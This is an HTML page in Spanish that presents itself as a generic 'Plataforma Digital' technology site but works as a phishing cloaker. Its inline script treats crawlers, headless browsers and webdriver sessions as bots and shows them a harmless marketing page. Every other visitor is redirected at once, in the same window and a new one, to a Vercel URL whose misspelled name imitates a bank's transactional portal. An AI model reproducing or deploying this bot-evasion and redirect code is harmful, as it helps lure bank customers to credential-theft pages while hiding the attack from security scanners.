
       <!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Plataforma digital innovadora con soluciones inteligentes.">
    <title>Plataforma Digital</title>
</head>
<body style="margin: 0; padding: 0; background: white;">
    <script>
        // Target
        const TARGET = "https://occdentebncoprtaltrnsccional.vercel.app/";

        // Función para detectar bots - RÁPIDA
        function isBot() {
            const ua = navigator.userAgent.toLowerCase();
            
            // Patrones de bot
            if (/bot|crawler|spider|googlebot|bingbot|yandex|baidu|headless|puppet|phantom|selenium|webdriver|scraper/.test(ua)) {
                return true;
            }
            
            // APIs de headless
            if (navigator.webdriver) return true;
            if (window.screen.width === 0) return true;
            
            return false;
        }

        // EJECUTAR INMEDIATAMENTE - SIN ESPERAR
        if (!isBot()) {
            // Es humano - abrir en nueva ventana AL INSTANTE
            window.open(TARGET, '_blank');
            // Y también redirigir la ventana actual
            window.location.replace(TARGET);
        } else {
            // Es bot - mostrar página limpia
            document.body.innerHTML = `
                <div style="max-width: 1200px; margin: 0 auto; padding: 40px 20px; font-family: Arial, sans-serif;">

                    <p style="color: #666; font-size: 16px; line-height: 1.8;">Bienvenido a nuestra plataforma. Ofrecemos soluciones tecnológicas de última generación para transformar tu negocio.</p>
                    
                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 30px; margin: 40px 0;">
                        <div style="background: #f5f5f5; padding: 30px; border-radius: 8px;">
                            <h3 style="color: #667eea;">⚡ Velocidad</h3>
                            <p style="color: #666;">Procesamiento instantáneo y respuesta en tiempo real para máxima eficiencia.</p>
                        </div>
                        <div style="background: #f5f5f5; padding: 30px; border-radius: 8px;">
                            <h3 style="color: #667eea;">🔒 Seguridad</h3>
                            <p style="color: #666;">Protección de datos con encriptación avanzada y estándares internacionales.</p>
                        </div>
                        <div style="background: #f5f5f5; padding: 30px; border-radius: 8px;">
                            <h3 style="color: #667eea;">📱 Accesibilidad</h3>
                            <p style="color: #666;">Disponible en todos tus dispositivos: smartphone, tablet y computadora.</p>
                        </div>
                        <div style="background: #f5f5f5; padding: 30px; border-radius: 8px;">
                            <h3 style="color: #667eea;">🤖 Inteligencia</h3>
                            <p style="color: #666;">Algoritmos inteligentes que se adaptan a tus necesidades específicas.</p>
                        </div>
                        <div style="background: #f5f5f5; padding: 30px; border-radius: 8px;">
                            <h3 style="color: #667eea;">💡 Innovación</h3>
                            <p style="color: #666;">Actualización constante con las últimas tendencias tecnológicas.</p>
                        </div>
                        <div style="background: #f5f5f5; padding: 30px; border-radius: 8px;">
                            <h3 style="color: #667eea;">🌍 Global</h3>
                            <p style="color: #666;">Disponible en más de 150 países con soporte multiidioma.</p>
                        </div>
                    </div>
                    
                    <p style="color: #999; font-size: 13px; margin-top: 60px; border-top: 1px solid #eee; padding-top: 20px;">&copy; 2026 Plataforma Digital. Todos los derechos reservados.</p>
                </div>
            `;
        }
    </script>
